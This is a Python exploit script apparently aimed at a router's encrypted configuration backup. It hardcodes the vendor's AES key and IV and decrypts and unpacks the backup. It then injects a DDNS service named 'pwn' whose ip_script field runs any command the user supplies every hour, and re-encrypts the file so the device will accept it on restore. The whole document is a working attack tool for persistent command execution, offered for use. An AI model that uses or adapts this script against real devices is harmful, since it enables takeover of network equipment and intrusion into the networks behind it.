#!/usr/bin/env python

import os
import re
import sys
import tarfile
import zlib
from io import BytesIO
from xml.sax.saxutils import escape

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


def aes_encrypt(plaintext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    return cipher.encrypt(pad(plaintext, AES.block_size))


def aes_decrypt(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    return unpad(cipher.decrypt(ciphertext), AES.block_size)


def inject_service(config, cmd):
    service = f"""
<service name="pwn">
<enabled>on</enabled>
<interface>internet</interface>
<ip_source>script</ip_source>
<ip_script>{escape(cmd)}</ip_script>
<check_interval>1</check_interval>
<check_unit>hours</check_unit>
<retry_interval>60</retry_interval>
<retry_times>5</retry_times>
<retry_unit>seconds</retry_unit>
<force_interval>72</force_interval>
<force_unit>hours</force_unit>
</service>
"""
    if b'<service name="pwn">' in config:
        return re.sub(
            rb'<service name="pwn">.*</ddns>', service.encode().lstrip() + b"</ddns>", config, flags=re.DOTALL
        )
    return config.replace(b"</service>\n</ddns>", f"</service>{service}</ddns>".encode())


def inject(content, cmd):
    content = zlib.decompress(aes_decrypt(content, key, iv))
    md5_header = content[:16]
    tar_data = BytesIO(content[16:])

    target_config_filename = "./ori-backup-user-config.bin"
    patched_tar_data = BytesIO()

    with tarfile.open(fileobj=patched_tar_data, mode="w") as ptar:
        with tarfile.open(fileobj=tar_data, mode="r") as tar:
            for member in tar:
                if member.name == target_config_filename:
                    config = zlib.decompress(aes_decrypt(tar.extractfile(member).read(), key, iv))
                    patched_config = inject_service(config, cmd)
                    patched_config = aes_encrypt(zlib.compress(patched_config), key, iv)

                    info = tarfile.TarInfo(target_config_filename)
                    info.size = len(patched_config)

                    ptar.addfile(info, BytesIO(patched_config))
                else:
                    ptar.addfile(member, tar.extractfile(member))

    patched_tar_data.seek(0)
    return aes_encrypt(zlib.compress(md5_header + patched_tar_data.read()), key, iv)


key = bytes.fromhex("2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836")
iv = bytes.fromhex("360028C9064242F81074F4C127D299F6")

if len(sys.argv) == 3:
    filename = sys.argv[1]
    with open(filename, "rb") as f:
        content = f.read()

    name, ext = os.path.splitext(filename)
    with open(name + "_patched" + ext, "wb") as f:
        f.write(inject(content, sys.argv[2]))
else:
    print("Usage: inject.py [FILE] [CMD]")
